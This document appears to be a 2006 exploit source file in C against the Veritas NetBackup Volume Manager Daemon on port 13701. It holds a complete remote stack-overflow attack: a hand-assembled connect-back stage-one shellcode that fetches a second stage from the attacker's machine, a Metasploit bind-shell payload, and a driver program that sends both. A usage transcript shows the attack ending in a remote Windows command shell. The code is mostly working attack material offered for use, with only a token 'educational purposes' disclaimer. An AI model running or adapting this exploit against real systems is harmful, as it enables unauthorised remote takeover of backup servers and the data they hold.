/*

	DESCRIPTION

	Veritas NetBackup Stack Overflow (tcp/13701)
	"Volume Manager Daemon" Module

	Advisories
	http://www.idefense.com/intelligence/vulnerabilities/display.php?id=336
	http://www.frsirt.com/english/advisories/2005/2349

	USAGE

	C:\NetBackup>nb 192.168.0.2 4444 192.168.0.200 0
	Veritas NetBackup v4/v5 "Volume Manager Daemon" Stack Overflow.
	Sending first buffer.
	Sending second buffer.

	C:\NetBackup>nc 192.168.0.200 4444
	Microsoft Windows 2000 [versie 5.00.2195]
	(C) Copyright 1985-2000 Microsoft Corp.

	C:\WINNT\system32>

	INFORMATION

	I wrote this just for educational purposes :).

	Because the buffer is only very small, I had to write small shellcode.
	The code is less than 100 bytes, and there are 6 bytes left. So there
	is still space to improve it. The stack seems to be static, every run
	at the exact same location.

	I used the Import Address Table (that looks like this):

	(taken from v5.1)
	Import Address Table
	00447230 (send)
	00447234 (recv)
	00447238 (accept)
	00447240 (listen)
	0044724C (connect)
	00447268 (closesocket)
	00447284 (bind)
	00447288 (socket)

	Using that shellcode I retrieve the "second" shellcode. This can be ANY
	code, and ANY size. No limitations.

	Tested on Windows 2000 Professional, Service Pack 4, Dutch.
	Tested on Veritas NetBackup 4.5, 5.0, 5.1 with some Maintenance Packs.
	(not all).

	Enjoy.

*/
#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib,"ws2_32")

DWORD WINAPI SendShellcode(LPVOID lpParam);
int iLocalOpenPort;

/* win32_bind -  EXITFUNC=seh LPORT=4444 Size=344 Encoder=PexFnstenvSub http://metasploit.com */
char szShellcode[] =
	"\x2b\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xd2"
	"\x4a\xe7\xed\x83\xeb\xfc\xe2\xf4\x2e\x20\x0c\xa0\x3a\xb3\x18\x12"
	"\x2d\x2a\x6c\x81\xf6\x6e\x6c\xa8\xee\xc1\x9b\xe8\xaa\x4b\x08\x66"
	"\x9d\x52\x6c\xb2\xf2\x4b\x0c\xa4\x59\x7e\x6c\xec\x3c\x7b\x27\x74"
	"\x7e\xce\x27\x99\xd5\x8b\x2d\xe0\xd3\x88\x0c\x19\xe9\x1e\xc3\xc5"
	"\xa7\xaf\x6c\xb2\xf6\x4b\x0c\x8b\x59\x46\xac\x66\x8d\x56\xe6\x06"
	"\xd1\x66\x6c\x64\xbe\x6e\xfb\x8c\x11\x7b\x3c\x89\x59\x09\xd7\x66"
	"\x92\x46\x6c\x9d\xce\xe7\x6c\xad\xda\x14\x8f\x63\x9c\x44\x0b\xbd"
	"\x2d\x9c\x81\xbe\xb4\x22\xd4\xdf\xba\x3d\x94\xdf\x8d\x1e\x18\x3d"
	"\xba\x81\x0a\x11\xe9\x1a\x18\x3b\x8d\xc3\x02\x8b\x53\xa7\xef\xef"
	"\x87\x20\xe5\x12\x02\x22\x3e\xe4\x27\xe7\xb0\x12\x04\x19\xb4\xbe"
	"\x81\x19\xa4\xbe\x91\x19\x18\x3d\xb4\x22\xf6\xb1\xb4\x19\x6e\x0c"
	"\x47\x22\x43\xf7\xa2\x8d\xb0\x12\x04\x20\xf7\xbc\x87\xb5\x37\x85"
	"\x76\xe7\xc9\x04\x85\xb5\x31\xbe\x87\xb5\x37\x85\x37\x03\x61\xa4"
	"\x85\xb5\x31\xbd\x86\x1e\xb2\x12\x02\xd9\x8f\x0a\xab\x8c\x9e\xba"
	"\x2d\x9c\xb2\x12\x02\x2c\x8d\x89\xb4\x22\x84\x80\x5b\xaf\x8d\xbd"
	"\x8b\x63\x2b\x64\x35\x20\xa3\x64\x30\x7b\x27\x1e\x78\xb4\xa5\xc0"
	"\x2c\x08\xcb\x7e\x5f\x30\xdf\x46\x79\xe1\x8f\x9f\x2c\xf9\xf1\x12"
	"\xa7\x0e\x18\x3b\x89\x1d\xb5\xbc\x83\x1b\x8d\xec\x83\x1b\xb2\xbc"
	"\x2d\x9a\x8f\x40\x0b\x4f\x29\xbe\x2d\x9c\x8d\x12\x2d\x7d\x18\x3d"
	"\x59\x1d\x1b\x6e\x16\x2e\x18\x3b\x80\xb5\x37\x85\x22\xc0\xe3\xb2"
	"\x81\xb5\x31\x12\x02\x4a\xe7\xed";

char szBuffer[] =
	// We cannot use this small part.
	"a"
	"AAAAAAAAAAAAAAAAAAAA"
	"AAAAAAAAAAAAAAAAAAAA"
	"AAAAAAAAAAAAAAAAAAAA"
	"AAAAAAAAAAAAAAAAAAA"

	// Since the buffer is so small, we even need a part of
	// the SOCKADDR_IN structure. No problem.

	// struct sockaddr_in {
	"BB"					// sin_family
	"BB"					// sin_port
	"BBBB"					// in_addr
	// "BBBBBBBB"			// sin_zero
	// }

	// 'START'

	// Move the stackpointer. (0x0012F??? -> 0x0012F000)
	"\xC1\xEC\x0C"			// SHR ESP, 0x0C
	"\xC1\xE4\x0C"			// SHL ESP, 0x0C

	// Call socket().
	"\x33\xDB"				// XOR EBX, EBX
	"\x53"					// PUSH EBX
	"\x43"					// INC EBX
	"\x53"					// PUSH EBX
	"\x43"					// INC EBX
	"\x53"					// PUSH EBX
	"\xBB\x88\x72\x44\x00"	// MOV EBX, 447288 [socket()]
	"\xFF\x13"				// JMP DWORD PTR [EBX]
	"\x8B\xF8"				// MOV EDI, EAX
	// [edi -> socket]

	// Call connect().
	"\x33\xDB"				// XOR EBX, EBX
	"\xB3\x16"				// MOV BL, 16
	"\x53"					// PUSH EBX
	"\xBB\x60\xF3\x12\x00"	// MOV EBX, 12F360
	"\x53"					// PUSH EBX
	"\x57"					// PUSH EDI
	"\xBB\x4C\x72\x44\x00"	// MOV EBX, 44724C [connect()]
	"\xFF\x13"				// JMP DWORD PTR [EBX]

	// We need space.
	"\x8B\xD4"				// MOV EDX, ESP
	"\x80\xC6\x01"			// ADD DH, 1

	// Call recv().
	"\x33\xDB"				// XOR EBX, EBX
	"\x53"					// PUSH EBX
	"\x43"					// INC EBX
	"\xC1\xE3\x10"			// SHL EBX, 8 [1 -> 65536]
	"\x53"					// PUSH EBX
	"\x52"					// PUSH EDX
	"\x57"					// PUSH EDI
	"\xBB\x34\x72\x44\x00"	// MOV EBX, 447234 [recv()]
	"\xFF\x13"				// JMP DWORD PTR [EBX]

	// And again.
	"\x8B\xD4"				// MOV EDX, ESP
	"\x80\xC6\x01"			// ADD DH, 1

	// Jump to our shellcode.
	"\xFF\xE2"				// JMP EDX

	"O"
	"W"
	"N"
	"E"
	"D"
	"!"

	"\x68\xF3\x12\x00"		// Here our code starts :).
	"\x00\xF0\x12\x00";		// Just a random readable address.

// This is the NOT-interesting part :).

DWORD main(int argc, char *argv[]) {
	printf("Veritas NetBackup v4/v5/v6 \"Volume Manager Daemon\" Stack Overflow.\n");

	// We need a local port and ip because our first buffer is way too small
	// to contain our complete shellcode. We use a small shellcode first to
	// retrieve the second shellcode. The only method that fitted as first
	// shellcode was a connect-back shellcode. For the second we got LOADS of
	// space :).
	if (argc<5) {
		printf("Usage: %s <local ip> <local port> <remote ip> <type>\n\n", argv[0]);
		printf("Types (tested):\n");
		printf(" 0 - NetBackup v5.0_1A\n");
		printf("     NetBackup v5.0_2\n");
		printf("     NetBackup v5.0_3\n");
		printf("     NetBackup v5.1\n\n");
		return NULL;
	}

	WSADATA wsa;
	WSAStartup(MAKEWORD(2,0), &wsa);

	sockaddr_in strTarget;
	memset(&strTarget, 0, sizeof(strTarget));
	strTarget.sin_addr.s_addr = inet_addr(argv[3]);
	strTarget.sin_family = AF_INET;
	strTarget.sin_port = htons(13701);

	iLocalOpenPort = atoi(argv[2]);
	HANDLE hStage2 = CreateThread(NULL, 0, SendShellcode, 0, 0, 0);

	SOCKET sTarget = socket(AF_INET, SOCK_STREAM, 0);
	int iResult = connect(sTarget, (struct sockaddr *)&strTarget, sizeof(strTarget));

	if (iResult != SOCKET_ERROR) {
		printf("Sending first buffer.\n");
		// Fill in the structure.
		unsigned long family = AF_INET;
		memcpy(szBuffer + 80, &family, 2);
		unsigned long port = htons(iLocalOpenPort);
		memcpy(szBuffer + 82, &port, 2);
		unsigned long ip = inet_addr(argv[1]);
		memcpy(szBuffer + 84, &ip, 4);

		send(sTarget, szBuffer, sizeof(szBuffer)-1, 0);
		closesocket(sTarget);
	}

	WaitForSingleObject(hStage2, 3000);
	WSACleanup();
	return NULL;
}

DWORD WINAPI SendShellcode(LPVOID lpParam) {
	SOCKET sTarget;
	SOCKET sAccept;
	struct hostent *hp;
	struct sockaddr_in strTarget;
	struct sockaddr_in strAccept;

	int iStrSize = sizeof(strTarget);

	memset(&strTarget, 0, sizeof(strTarget));
	strTarget.sin_addr.s_addr = INADDR_ANY;
	strTarget.sin_family = AF_INET;
	strTarget.sin_port = htons(iLocalOpenPort);

	sTarget = socket(AF_INET, SOCK_STREAM, 0);
	bind(sTarget, (struct sockaddr *)&strTarget, iStrSize);
	listen(sTarget, 2);
	sAccept = accept(sTarget, (struct sockaddr *)&strAccept, &iStrSize);

	if (sAccept != INVALID_SOCKET) {
		printf("Sending second buffer.\n");
		send(sAccept, szShellcode, sizeof(szShellcode) - 1, 0);
		closesocket(sAccept);
	}

	return NULL;
}

// milw0rm.com [2006-01-16]
